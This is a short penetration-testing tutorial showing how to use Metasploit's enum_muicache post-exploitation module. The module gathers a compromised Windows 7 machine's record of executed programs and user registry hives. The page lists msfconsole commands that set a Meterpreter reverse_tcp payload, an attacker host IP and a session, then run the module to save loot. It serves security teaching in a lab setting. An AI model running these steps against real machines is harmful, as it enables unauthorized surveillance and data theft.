<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">How to Gather MUICache Entries in Remote Windows PC</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/how-to-gather-muicache-entries-in-remote-windows-pc/" rel="bookmark"><time class="entry-date published" datetime="2014-06-10T09:41:52+00:00">June 10, 2014</time><time class="updated" datetime="2025-05-27T12:04:56+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: rgb(0, 0, 0);">According to Nirsoft.net, “each time that you start using a new application, Windows operating system automatically extract the application name from the version resource of the exe file, and stores it for using it later, in Registry key known as the ‘MuiCache’.”</span></p>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);">This module gathers information about the files and file paths that logged on users have executed on the system. It also will check if the file still exists on the system. This information is gathered by using information stored under the MUICache registry key. If the user is logged in when the module is executed it will collect the MUICache entries by accessing the registry directly. If the user is not logged in the module will download users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are parsed from the downloaded hive.</span></p>
<h4 style="text-align: justify;"><span style="color: rgb(0, 0, 0);"><strong>Exploit Targets</strong></span></h4>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);">Windows 7</span></p>
<h4 style="text-align: justify;"><span style="color: rgb(0, 0, 0);"><strong>Requirement</strong></span></h4>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);"><strong>Attacker</strong>: kali Linux</span></p>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);"><strong>Victim PC</strong>: Windows 7</span></p>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);">Open Kali terminal type <strong>msfconsole</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="http://3.bp.blogspot.com/-3fIrCDeFr2A/U5bQ_347tVI/AAAAAAAAH9c/dJi8bF-zk5E/s1600/1.png" alt=""/></p>
<p><span style="color: rgb(0, 0, 0);">Now type <strong>use post/windows/gather/enum_muicache</strong></span></p>
<p><span style="color: rgb(0, 0, 0);">msf exploit (<span style="color: rgb(128, 0, 0);"><strong>enum_muicache</strong></span>)&gt;<strong>set payload windows/meterpreter/reverse_tcp</strong></span></p>
<p><span style="color: rgb(0, 0, 0);">msf exploit (<span style="color: rgb(128, 0, 0);"><strong>enum_muicache</strong></span>)&gt;<strong>set lhost 192.168.1.3</strong> (IP of Local Host)</span></p>
<p><span style="color: rgb(0, 0, 0);">msf exploit (<span style="color: rgb(128, 0, 0);"><strong>enum_muicache</strong></span>)&gt;<strong>set session 2</strong></span></p>
<p><span style="color: rgb(0, 0, 0);">msf exploit (<span style="color: rgb(128, 0, 0);"><strong>enum_muicache</strong></span>)&gt;<strong>exploit</strong></span></p>
<p><img decoding="async" src="http://1.bp.blogspot.com/-FJM-_XIQhOU/U5bRIFqrgjI/AAAAAAAAH9k/ORVaSSEOdSY/s1600/2.png" alt=""/></p>
<p><img decoding="async" src="http://4.bp.blogspot.com/-iBfH4WIuTbc/U5bRQ3pv5PI/AAAAAAAAH9s/2-Pk94MG9w8/s1600/3.png" alt=""/></p>
<p><img decoding="async" src="http://3.bp.blogspot.com/-S5iVy_eOugY/U5bRXrRDiwI/AAAAAAAAH90/CHerxCwgXyg/s1600/4.png" alt=""/></p>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);"> Result will stored on your local computer</span></p>
<p style="text-align: justify;"><span style="color: rgb(0, 0, 0);"><strong>/root/.msf4/loot</strong><strong>/</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="http://4.bp.blogspot.com/-zB64xYYgtSU/U5bRm0IHT0I/AAAAAAAAH98/sQPnUhCt_jg/s1600/6.png" alt=""/></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
